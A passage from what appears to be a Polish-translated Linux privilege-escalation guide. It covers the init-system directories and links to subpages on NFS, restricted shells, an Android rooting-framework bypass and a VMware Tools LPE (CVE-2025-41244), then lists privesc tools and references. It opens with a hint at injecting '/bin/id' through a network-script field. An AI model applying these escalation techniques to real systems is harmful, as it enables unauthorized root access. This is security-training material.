ONBOOT=yes
DEVICE=eth0
```
(_Note the blank space between Network and /bin/id_)

### **init, init.d, systemd, and rc.d**

Katalog `/etc/init.d` jest domem dla **skryptów** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami Linux**. Zawiera skrypty do `start`, `stop`, `restart`, a czasem `reload` usług. Mogą być wykonywane bezpośrednio albo przez symboliczne linki znajdujące się w `/etc/rc?.d/`. Alternatywna ścieżka w systemach Redhat to `/etc/rc.d/init.d`.

Z drugiej strony, `/etc/init` jest powiązany z **Upstart**, nowszym **zarządzaniem usługami** wprowadzonym przez Ubuntu, używającym plików konfiguracyjnych do zadań zarządzania usługami. Mimo przejścia na Upstart, skrypty SysVinit są nadal używane obok konfiguracji Upstart z powodu warstwy kompatybilności w Upstart.

**systemd** pojawia się jako nowoczesny menedżer inicjalizacji i usług, oferujący zaawansowane funkcje, takie jak uruchamianie demonów na żądanie, zarządzanie automount oraz migawki stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucji oraz `/etc/systemd/system/` dla modyfikacji administratora, usprawniając proces administracji systemem.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Frameworki rootowania Androida zwykle hookują syscall, aby ujawnić uprzywilejowaną funkcjonalność kernela dla użytkownika-space managera. Słaba autentykacja managera (np. sprawdzanie podpisu oparte na kolejności FD lub słabe schematy haseł) może umożliwić lokalnej aplikacji podszycie się pod managera i eskalację do root na już zrootowanych urządzeniach. Dowiedz się więcej i zobacz szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Wykrywanie usług oparte na regex w VMware Tools/Aria Operations może wyodrębnić ścieżkę binarną z command line procesów i wykonać ją z -v w uprzywilejowanym kontekście. Permisywne wzorce (np. używające \S) mogą dopasować listenerów przygotowanych przez atakującego w zapisywalnych lokalizacjach (np. /tmp/httpd), prowadząc do wykonania jako root (CWE-426 Untrusted Search Path).

Dowiedz się więcej i zobacz uogólniony wzorzec mający zastosowanie do innych stosów discovery/monitoring tutaj:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najlepsze narzędzie do szukania wektorów lokalnej eskalacji uprawnień w Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Wylicza podatności kernela w Linux i MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
